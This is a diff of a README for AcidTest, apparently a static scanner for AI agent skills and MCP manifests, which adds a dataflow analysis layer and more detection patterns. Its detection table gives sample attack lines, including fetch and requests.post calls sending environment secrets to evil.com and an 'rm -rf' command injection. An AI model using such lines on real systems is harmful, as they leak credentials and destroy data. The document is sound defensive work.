@@ -93,7 +93,7 @@ RECOMMENDATION: Do not install. Prompt injection attempt detected.
 | **Arbitrary Code Execution** | `eval(userInput)`, `new Function()` | `eval(user_input)`, `exec(code)` | AST analysis + pattern matching |
 | **Command Injection** | `exec('rm -rf ' + dir)` | `subprocess.run(cmd, shell=True)` | AST analysis + pattern matching |
 | **Unsafe Deserialization** | N/A | `pickle.loads(data)` | AST analysis + pattern matching |
-| **Data Exfiltration** | `fetch('evil.com', {body: process.env})` | `requests.post('evil.com', data=os.environ)` | Cross-reference layer |
+| **Data Exfiltration** | `const k = process.env.KEY; fetch('evil.com', {body: k})` | `key = os.environ['KEY']; requests.post('evil.com', data=key)` | Dataflow analysis |
 | **Hardcoded Credentials** | `apiKey = "sk_live_..."` | `API_KEY = "sk_live_..."` | Pattern matching + entropy |
 | **Prompt Injection** | Markdown instruction override | Markdown instruction override | Injection detection layer |
 | **Obfuscation** | Base64/hex encoded payloads | Base64/hex encoded payloads | Shannon entropy analysis |
@@ -106,26 +106,28 @@ RECOMMENDATION: Do not install. Prompt injection attempt detected.
 - Runtime behavior outside static analysis scope
 - Sophisticated polymorphic code or advanced VM-level evasion
 
-See [METHODOLOGY.md](./METHODOLOGY.md) for full transparency on capabilities and limitations (~85-90% detection rate).
+See [METHODOLOGY.md](./METHODOLOGY.md) for full transparency on capabilities and limitations (~90-95% detection rate with dataflow).
 
 ## How It Works
 
-AcidTest runs four analysis layers:
+AcidTest runs five analysis layers:
 1. **Permission Audit**: Analyzes declared permissions (bins, env, tools)
 2. **Prompt Injection Scan**: Detects instruction override attempts (AgentSkills)
 3. **Code Analysis**: Multi-language AST analysis + Shannon entropy detection for obfuscation
 4. **Cross-Reference**: Catches code behavior not matching declared permissions
+5. **Dataflow Analysis** ✨ NEW: Tracks taint flow from sources (env vars, user input) to dangerous sinks (exec, fetch)
 
 **Language Support:**
-- **TypeScript/JavaScript**: Full AST analysis with 48 security patterns
-- **Python**: Full AST analysis with 31 Python-specific patterns (tree-sitter based)
-- Detects eval/exec, subprocess injection, unsafe deserialization, and more
+- **TypeScript/JavaScript**: Full AST analysis with 59 security patterns
+- **Python**: Full AST analysis with 45 Python-specific patterns (tree-sitter based)
+- Detects eval/exec, subprocess injection, unsafe deserialization, SQL injection, XSS, and more
 
 **Advanced Features:**
-- Total 79 security patterns across both languages
-- Entropy analysis detects base64/hex encoding and obfuscated strings
-- Context-aware detection (shell=True, SafeLoader, etc.)
-- CI/CD integration via GitHub Actions and pre-commit hooks
+- **104 security patterns** across 14 categories (SQL injection, XSS, insecure crypto, prototype pollution, etc.)
+- **Multi-step attack detection**: Tracks data flow through assignments, properties, and function calls
+- **Entropy analysis**: Detects base64/hex encoding and obfuscated strings
+- **Context-aware detection**: shell=True, SafeLoader, dangerouslySetInnerHTML, etc.
+- **CI/CD integration**: GitHub Actions and pre-commit hooks
 
 Works with both SKILL.md (AgentSkills) and MCP manifests (mcp.json, server.json, package.json).
 
